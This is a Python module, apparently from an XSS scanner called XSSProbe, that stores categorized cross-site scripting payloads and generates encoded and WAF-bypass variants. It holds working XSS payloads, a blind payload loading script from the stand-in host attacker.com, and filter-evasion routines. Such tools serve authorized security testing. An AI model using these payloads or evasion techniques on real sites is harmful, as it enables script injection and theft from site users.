"""
Enhanced Payload Management System for XSSProbe
Provides categorized, configurable XSS payloads with encoding support
"""

import json
import os
import random
from typing import Dict, List, Optional
from urllib.parse import quote, quote_plus
import html


class PayloadManager:
    """Advanced payload management with categorization and encoding"""
    
    def __init__(self, payload_dir: str = "payloads"):
        self.payload_dir = payload_dir
        self.payloads = {}
        self.load_payloads()
    
    def load_payloads(self):
        """Load payloads from JSON configuration files"""
        categories = ["reflected", "dom", "stored", "blind", "waf_bypass"]
        
        for category in categories:
            file_path = os.path.join(self.payload_dir, f"{category}.json")
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    self.payloads[category] = json.load(f)
            else:
                self.payloads[category] = self._get_default_payloads(category)
    
    def _get_default_payloads(self, category: str) -> List[Dict]:
        """Return default payloads for a category"""
        defaults = {
            "reflected": [
                {
                    "name": "Basic Script Alert",
                    "payload": "<script>alert('XSS')</script>",
                    "description": "Standard XSS payload",
                    "severity": "high",
                    "context": "html"
                },
                {
                    "name": "Image Onerror",
                    "payload": "<img src=x onerror=alert('XSS')>",
                    "description": "Image tag with onerror event",
                    "severity": "high",
                    "context": "html"
                },
                {
                    "name": "SVG Onload",
                    "payload": "<svg onload=alert('XSS')>",
                    "description": "SVG element with onload event",
                    "severity": "high",
                    "context": "html"
                }
            ],
            "dom": [
                {
                    "name": "Hash Fragment",
                    "payload": "#<script>alert('DOM_XSS')</script>",
                    "description": "DOM XSS via URL fragment",
                    "severity": "high",
                    "context": "url_fragment"
                },
                {
                    "name": "Location Hash innerHTML",
                    "payload": "#<img src=x onerror=alert('DOM_XSS')>",
                    "description": "DOM manipulation via location.hash",
                    "severity": "high",
                    "context": "url_fragment"
                }
            ],
            "stored": [
                {
                    "name": "Persistent Script",
                    "payload": "<script>alert('STORED_XSS')</script>",
                    "description": "Basic stored XSS payload",
                    "severity": "critical",
                    "context": "html"
                }
            ],
            "blind": [
                {
                    "name": "External Script Load",
                    "payload": "<script src='//attacker.com/xss.js'></script>",
                    "description": "Blind XSS with external script",
                    "severity": "high",
                    "context": "html"
                }
            ],
            "waf_bypass": [
                {
                    "name": "Unicode Bypass",
                    "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "description": "WAF bypass using character codes",
                    "severity": "medium",
                    "context": "html"
                }
            ]
        }
        return defaults.get(category, [])
    
    def get_payloads(self, category: str = None, context: str = None, 
                    severity: str = None) -> List[Dict]:
        """Get payloads with optional filtering"""
        if category:
            payloads = self.payloads.get(category, [])
        else:
            payloads = []
            for cat_payloads in self.payloads.values():
                payloads.extend(cat_payloads)
        
        # Filter by context
        if context:
            payloads = [p for p in payloads if p.get('context') == context]
        
        # Filter by severity
        if severity:
            payloads = [p for p in payloads if p.get('severity') == severity]
        
        return payloads
    
    def get_random_payload(self, category: str = None) -> Dict:
        """Get a random payload from specified category or all"""
        payloads = self.get_payloads(category)
        return random.choice(payloads) if payloads else None
    
    def encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload using specified method"""
        encoders = {
            'url': lambda p: quote(p),
            'url_plus': lambda p: quote_plus(p),
            'html': lambda p: html.escape(p),
            'unicode': lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
            'hex': lambda p: ''.join(f'\\x{ord(c):02x}' for c in p),
            'double_url': lambda p: quote(quote(p)),
            'base64': self._base64_encode,
            'none': lambda p: p
        }
        
        encoder = encoders.get(encoding, encoders['none'])
        return encoder(payload)
    
    def _base64_encode(self, payload: str) -> str:
        """Base64 encode payload"""
        import base64
        return base64.b64encode(payload.encode()).decode()
    
    def generate_payload_variations(self, base_payload: str) -> List[str]:
        """Generate multiple variations of a payload"""
        variations = [base_payload]
        
        # Case variations
        variations.append(base_payload.upper())
        variations.append(base_payload.lower())
        
        # Encoding variations
        encodings = ['url', 'html', 'unicode', 'hex']
        for encoding in encodings:
            variations.append(self.encode_payload(base_payload, encoding))
        
        # Space variations
        space_chars = ['%20', '+', '%09', '%0a', '%0d', '/**/']
        for space_char in space_chars:
            variations.append(base_payload.replace(' ', space_char))
        
        # Quote variations
        quote_variations = [
            base_payload.replace('"', "'"),
            base_payload.replace("'", '"'),
            base_payload.replace('"', '`'),
            base_payload.replace("'", '`')
        ]
        variations.extend(quote_variations)
        
        return list(set(variations))  # Remove duplicates
    
    def create_custom_payload(self, name: str, payload: str, description: str,
                            category: str = "custom", severity: str = "medium",
                            context: str = "html") -> Dict:
        """Create a custom payload entry"""
        return {
            "name": name,
            "payload": payload,
            "description": description,
            "severity": severity,
            "context": context,
            "category": category,
            "custom": True
        }
    
    def save_payload(self, payload_data: Dict, category: str):
        """Save a payload to the specified category file"""
        if category not in self.payloads:
            self.payloads[category] = []
        
        self.payloads[category].append(payload_data)
        
        # Save to file
        file_path = os.path.join(self.payload_dir, f"{category}.json")
        os.makedirs(self.payload_dir, exist_ok=True)
        
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(self.payloads[category], f, indent=2, ensure_ascii=False)
    
    def get_payload_statistics(self) -> Dict:
        """Get statistics about loaded payloads"""
        stats = {
            "total_payloads": 0,
            "categories": {},
            "severities": {},
            "contexts": {}
        }
        
        for category, payloads in self.payloads.items():
            stats["categories"][category] = len(payloads)
            stats["total_payloads"] += len(payloads)
            
            for payload in payloads:
                severity = payload.get("severity", "unknown")
                context = payload.get("context", "unknown")
                
                stats["severities"][severity] = stats["severities"].get(severity, 0) + 1
                stats["contexts"][context] = stats["contexts"].get(context, 0) + 1
        
        return stats


class AdvancedPayloadGenerator:
    """Generate advanced payloads with evasion techniques"""
    
    def __init__(self, payload_manager: PayloadManager):
        self.payload_manager = payload_manager
    
    def generate_waf_bypass_payloads(self, base_payload: str) -> List[str]:
        """Generate WAF bypass variations"""
        bypasses = []
        
        # HTML encoding bypass
        bypasses.append(self._html_encode_random_chars(base_payload))
        
        # JavaScript string concatenation
        bypasses.append(self._js_string_concat(base_payload))
        
        # Unicode bypass
        bypasses.append(self._unicode_normalize(base_payload))
        
        # Comment insertion
        bypasses.append(self._insert_comments(base_payload))
        
        # Case mixing
        bypasses.append(self._mix_case(base_payload))
        
        return bypasses
    
    def _html_encode_random_chars(self, payload: str) -> str:
        """Randomly HTML encode some characters"""
        chars = list(payload)
        for i in range(len(chars)):
            if random.random() < 0.3:  # 30% chance to encode
                chars[i] = f"&#{ord(chars[i])};"
        return ''.join(chars)
    
    def _js_string_concat(self, payload: str) -> str:
        """Use JavaScript string concatenation"""
        if "alert" in payload:
            return payload.replace("alert", "window['ale'+'rt']")
        return payload
    
    def _unicode_normalize(self, payload: str) -> str:
        """Use Unicode normalization"""
        return payload.replace("script", "scr\\u0069pt")
    
    def _insert_comments(self, payload: str) -> str:
        """Insert HTML/JS comments"""
        return payload.replace("<script>", "<script>/*bypass*/")
    
    def _mix_case(self, payload: str) -> str:
        """Mix upper/lower case"""
        result = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                result += char.upper() if i % 2 == 0 else char.lower()
            else:
                result += char
        return result


# Example usage and testing
if __name__ == "__main__":
    # Initialize payload manager
    pm = PayloadManager()
    
    # Get payloads by category
    reflected_payloads = pm.get_payloads("reflected")
    print(f"Reflected XSS payloads: {len(reflected_payloads)}")
    
    # Get random payload
    random_payload = pm.get_random_payload("dom")
    print(f"Random DOM payload: {random_payload}")
    
    # Generate variations
    base = "<script>alert('test')</script>"
    variations = pm.generate_payload_variations(base)
    print(f"Generated {len(variations)} variations")
    
    # Advanced bypass generation
    generator = AdvancedPayloadGenerator(pm)
    bypasses = generator.generate_waf_bypass_payloads(base)
    print(f"WAF bypass payloads: {bypasses}")
    
    # Statistics
    stats = pm.get_payload_statistics()
    print(f"Payload statistics: {stats}")